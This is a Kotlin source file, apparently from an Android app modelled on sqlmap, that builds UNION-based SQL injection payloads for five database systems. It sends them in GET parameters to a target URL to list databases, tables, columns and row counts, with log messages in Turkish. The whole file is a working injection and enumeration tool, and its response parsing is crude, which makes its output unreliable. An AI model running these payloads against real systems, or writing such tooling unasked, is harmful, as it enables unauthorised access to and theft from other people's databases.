package com.sqlmap.app.sqlmap.manager

import com.sqlmap.app.network.http.HttpClient
import com.sqlmap.app.utils.helpers.LogLevel
import com.sqlmap.app.utils.helpers.LoggingHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

data class DatabaseInfo(
    val name: String,
    val tables: List<TableInfo> = emptyList()
)

data class TableInfo(
    val name: String,
    val columns: List<ColumnInfo> = emptyList(),
    val recordCount: Int = 0
)

data class ColumnInfo(
    val name: String,
    val type: String = "VARCHAR",
    val nullable: Boolean = true
)

class DatabaseEnumManager(
    private val httpClient: HttpClient,
    private val logger: LoggingHelper
) {
    
    suspend fun enumerateDatabases(
        targetUrl: String,
        injectionParameter: String,
        dbms: String
    ): List<DatabaseInfo> = withContext(Dispatchers.IO) {
        logger.log("Veritabanları listeleme başladı... (DBMS: $dbms)")
        
        val databases = mutableListOf<DatabaseInfo>()
        
        return@withContext try {
            // DBMS'e göre payload seç
            val dbsPayload = when (dbms.lowercase()) {
                "mysql", "mariadb" -> {
                    "' UNION SELECT schema_name FROM information_schema.schemata--"
                }
                "postgresql" -> {
                    "' UNION SELECT datname FROM pg_database--"
                }
                "mssql" -> {
                    "' UNION SELECT name FROM sys.databases--"
                }
                "oracle" -> {
                    "' UNION SELECT username FROM dba_users--"
                }
                "sqlite" -> {
                    "' UNION SELECT name FROM sqlite_master WHERE type='table'--"
                }
                else -> {
                    "' UNION SELECT database()--"
                }
            }
            
            logger.log("Payload gönderiliyor: $dbsPayload")
            
            val injectedUrl = if (targetUrl.contains("?")) {
                "$targetUrl&$injectionParameter=$dbsPayload"
            } else {
                "$targetUrl?$injectionParameter=$dbsPayload"
            }
            
            val response = httpClient.sendRequest(injectedUrl, "GET")
            
            if (response.statusCode == 200) {
                // Parse response and extract database names
                val dbNames = extractDatabases(response.body, dbms)
                
                logger.log("${dbNames.size} veritabanı bulundu:")
                dbNames.forEach { dbName ->
                    logger.log("  ├─ $dbName")
                    databases.add(DatabaseInfo(name = dbName))
                }
                
                // Enumerate tables for each database
                for (db in databases) {
                    val tables = enumerateTables(
                        targetUrl, injectionParameter, dbms, db.name
                    )
                    databases[databases.indexOf(db)] = db.copy(tables = tables)
                }
            } else {
                logger.log("Veritabanı listeleme başarısız. Status: ${response.statusCode}", 
                    LogLevel.ERROR)
            }
            
            databases
            
        } catch (e: Exception) {
            logger.log("Veritabanı enum hatası: ${e.message}", 
                LogLevel.ERROR)
            emptyList()
        }
    }
    
    private suspend fun enumerateTables(
        targetUrl: String,
        injectionParameter: String,
        dbms: String,
        database: String
    ): List<TableInfo> = withContext(Dispatchers.IO) {
        logger.log("Tabloları listeleme: $database")
        
        return@withContext try {
            val tablesPayload = when (dbms.lowercase()) {
                "mysql", "mariadb" -> {
                    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='$database'--"
                }
                "postgresql" -> {
                    "' UNION SELECT tablename FROM pg_tables WHERE schemaname='$database'--"
                }
                "mssql" -> {
                    "' UNION SELECT name FROM sys.tables WHERE database_id=DB_ID('$database')--"
                }
                "oracle" -> {
                    "' UNION SELECT table_name FROM user_tables--"
                }
                else -> {
                    "' UNION SELECT name FROM sqlite_master WHERE type='table' AND db='$database'--"
                }
            }
            
            logger.log("Tablo payload: $tablesPayload")
            
            val injectedUrl = if (targetUrl.contains("?")) {
                "$targetUrl&$injectionParameter=$tablesPayload"
            } else {
                "$targetUrl?$injectionParameter=$tablesPayload"
            }
            
            val response = httpClient.sendRequest(injectedUrl, "GET")
            
            if (response.statusCode == 200) {
                val tableNames = extractTables(response.body, dbms)
                logger.log("${tableNames.size} tablo bulundu")
                
                val tables = mutableListOf<TableInfo>()
                for (tableName in tableNames) {
                    logger.log("  ├─ $tableName")
                    
                    // Enumerate columns for this table
                    val columns = enumerateColumns(
                        targetUrl, injectionParameter, dbms, database, tableName
                    )
                    
                    tables.add(TableInfo(
                        name = tableName,
                        columns = columns,
                        recordCount = getRecordCount(
                            targetUrl, injectionParameter, dbms, database, tableName
                        )
                    ))
                }
                tables
            } else {
                emptyList()
            }
            
        } catch (e: Exception) {
            logger.log("Tablo enum hatası: ${e.message}", 
                LogLevel.ERROR)
            emptyList()
        }
    }
    
    private suspend fun enumerateColumns(
        targetUrl: String,
        injectionParameter: String,
        dbms: String,
        database: String,
        table: String
    ): List<ColumnInfo> = withContext(Dispatchers.IO) {
        logger.log("Sütunları listeleme: $database.$table")
        
        return@withContext try {
            val columnsPayload = when (dbms.lowercase()) {
                "mysql", "mariadb" -> {
                    "' UNION SELECT CONCAT(column_name,':',column_type) FROM information_schema.columns WHERE table_schema='$database' AND table_name='$table'--"
                }
                "postgresql" -> {
                    "' UNION SELECT column_name FROM information_schema.columns WHERE table_schema='$database' AND table_name='$table'--"
                }
                "mssql" -> {
                    "' UNION SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('$database.dbo.$table')--"
                }
                else -> {
                    "' UNION SELECT name FROM pragma_table_info('$table')--"
                }
            }
            
            val injectedUrl = if (targetUrl.contains("?")) {
                "$targetUrl&$injectionParameter=$columnsPayload"
            } else {
                "$targetUrl?$injectionParameter=$columnsPayload"
            }
            
            val response = httpClient.sendRequest(injectedUrl, "GET")
            
            if (response.statusCode == 200) {
                extractColumns(response.body, dbms)
            } else {
                emptyList()
            }
            
        } catch (e: Exception) {
            logger.log("Sütun enum hatası: ${e.message}", 
                LogLevel.ERROR)
            emptyList()
        }
    }
    
    private suspend fun getRecordCount(
        targetUrl: String,
        injectionParameter: String,
        dbms: String,
        database: String,
        table: String
    ): Int = withContext(Dispatchers.IO) {
        return@withContext try {
            val countPayload = when (dbms.lowercase()) {
                "mysql", "mariadb" -> {
                    "' UNION SELECT COUNT(*) FROM $database.$table--"
                }
                "postgresql" -> {
                    "' UNION SELECT COUNT(*) FROM $database.$table--"
                }
                "mssql" -> {
                    "' UNION SELECT COUNT(*) FROM [$database].dbo.[$table]--"
                }
                else -> {
                    "' UNION SELECT COUNT(*) FROM $table--"
                }
            }
            
            val injectedUrl = if (targetUrl.contains("?")) {
                "$targetUrl&$injectionParameter=$countPayload"
            } else {
                "$targetUrl?$injectionParameter=$countPayload"
            }
            
            val response = httpClient.sendRequest(injectedUrl, "GET")
            
            if (response.statusCode == 200) {
                extractNumber(response.body)
            } else {
                0
            }
            
        } catch (e: Exception) {
            0
        }
    }
    
    private fun extractDatabases(body: String, dbms: String): List<String> {
        // Parse response body for database names
        val regex = Regex("<.*?>([a-zA-Z0-9_]+)</.*?>")
        return regex.findAll(body).map { it.groupValues[1] }.distinct().toList()
    }
    
    private fun extractTables(body: String, dbms: String): List<String> {
        val regex = Regex("[a-zA-Z0-9_]+")
        return regex.findAll(body).map { it.value }.distinct().toList()
    }
    
    private fun extractColumns(body: String, dbms: String): List<ColumnInfo> {
        val columns = mutableListOf<ColumnInfo>()
        val regex = Regex("([a-zA-Z0-9_]+)(?::([a-zA-Z0-9_]+))?")
        regex.findAll(body).forEach { match ->
            columns.add(
                ColumnInfo(
                    name = match.groupValues[1],
                    type = match.groupValues.getOrNull(2) ?: "VARCHAR"
                )
            )
        }
        return columns
    }
    
    private fun extractNumber(body: String): Int {
        val regex = Regex("\\d+")
        return regex.find(body)?.value?.toIntOrNull() ?: 0
    }
}
